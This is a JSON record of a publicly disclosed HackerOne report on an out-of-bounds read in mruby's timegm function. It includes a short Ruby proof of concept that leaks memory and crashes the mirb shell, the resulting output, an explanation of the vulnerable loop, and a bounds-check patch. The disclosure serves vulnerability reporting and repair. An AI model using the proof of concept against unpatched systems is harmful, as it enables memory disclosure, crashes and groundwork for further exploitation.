{
  "id": 192896,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTI4OTY=",
  "url": "https://hackerone.com/reports/192896",
  "title": "Memory disclosure in timegm",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2016-12-20T23:15:59.341Z",
  "submitted_at": "2016-12-20T23:15:59.341Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "volc",
    "url": "/volc",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15668,
    "url": "https://hackerone.com/shopify-scripts",
    "handle": "shopify-scripts",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "shopify-scripts",
      "twitter_handle": "",
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-01-31T23:41:39.854Z",
  "bug_reporter_agreed_on_going_public_at": "2017-01-31T23:41:39.813Z",
  "team_member_agreed_on_going_public_at": "2017-01-30T21:23:57.184Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "An attacker may disclose memory or/and crash mirb.\n\n# PoC\n\n```ruby\n@a = ''\nfor i in 0..50 do\n  t = Time.new(1970, 12 + i + 1).to_i - Time.new(1970, 12 + i).to_i\n  @a << t.to_s(16)\n  @a << \" \"\nend\n\n@a\n\nTime.new(1970, 0x10000)\n```\n\nOutput:\n\n```shell\n$ ./bin/mruby-engine-mirb < timgm.rb \nmirb - Embeddable Interactive Ruby Shell\n\n> * * * * *  => 0..50\n>  => nil\n>  => \"28de80 28de80 263b80 28de80 278d00 28de80 278d00 28de80 28de80 278d00 28de80 278d00 28de80 49dab380 ee655600 feabe80 98ee00 9facec80 97bc0380 c22e3e00 5b9a3280 c90abe00 4274900 6e4eec80 0 0 0 0 0 85430f00 b883c900 cb470380 defdb180 5c70380 9fa10f00 fca10f00 65153180 2d94ec80 70eca680 23bd5500 a012600 0 0 0 0 17e78500 0 54600 0 c3ae0f80 0 \"\n>  => nil\n> Segmentation fault\n```\n\n\n\n# Explanation\n\nThe vulnerability is located in the `timegm` function (`ext/mruby_engine/mruby-time/src/time.c`). The variable `tm->tm_mon` is controlled by the attacker while it must be lower than 12. An out-of-bound access occurs if `tm->tm_mon` is greater than 11, and the memory after the static array `ndays` is read.\n\n```C\nstatic time_t\ntimegm(struct tm *tm)\n{\n  static const unsigned int ndays[2][12] = {\n    {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31},\n    {31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}\n  };\n  time_t r = 0;\n  int i;\n  unsigned int *nday = (unsigned int*) ndays[is_leapyear(tm->tm_year+1900)];\n\n  for (i = 70; i < tm->tm_year; ++i)\n    r += is_leapyear(i+1900) ? 366*24*60*60 : 365*24*60*60;\n  for (i = 0; i < tm->tm_mon; ++i)\n    r += nday[i] * 24 * 60 * 60;\n```\n\n\n\n# Impact\n\nAn attacker may:\n\n- crash mirb\n- read parts of the memory, which can help to build a reliable exploit thanks to an additional vulnerability\n\n\n\n# Patch\n\n```diff\ndiff --git a/ext/mruby_engine/mruby-time/src/time.c b/ext/mruby_engine/mruby-time/src/time.c\nindex 8884a5d..ce21043 100644\n--- a/ext/mruby_engine/mruby-time/src/time.c\n+++ b/ext/mruby_engine/mruby-time/src/time.c\n@@ -130,7 +130,7 @@ timegm(struct tm *tm)\n \n   for (i = 70; i < tm->tm_year; ++i)\n     r += is_leapyear(i+1900) ? 366*24*60*60 : 365*24*60*60;\n-  for (i = 0; i < tm->tm_mon; ++i)\n+  for (i = 0; i < tm->tm_mon && i < 12; ++i)\n     r += nday[i] * 24 * 60 * 60;\n   r += (tm->tm_mday - 1) * 24 * 60 * 60;\n   r += tm->tm_hour * 60 * 60;\n```",
  "bounty_amount": "1000.0",
  "formatted_bounty": "$1,000",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-03-01T21:23:57.233Z",
  "allow_singular_disclosure_after": -219424032.42783952,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "marotagem_vrt",
    "mpz",
    "eveeez",
    "khizer47",
    "spetr0x",
    "h4ck3r0ne",
    "restdimension181117"
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
